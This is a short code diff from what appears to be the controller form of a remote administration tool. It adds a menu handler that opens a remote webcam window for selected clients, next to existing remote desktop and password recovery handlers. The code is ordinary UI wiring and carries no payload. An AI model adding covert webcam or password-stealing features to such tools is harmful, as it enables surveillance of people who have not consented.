@@ -692,7 +692,19 @@ namespace xServer.Forms
                 frmRDP.Show();
             }
         }
-
+        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                if (c.Value.FrmWebcam != null)
+                {
+                    c.Value.FrmWebcam.Focus();
+                    return;
+                }
+                FrmRemoteWebcam frmWebcam = new FrmRemoteWebcam(c);
+                frmWebcam.Show();
+            }
+        }
         private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
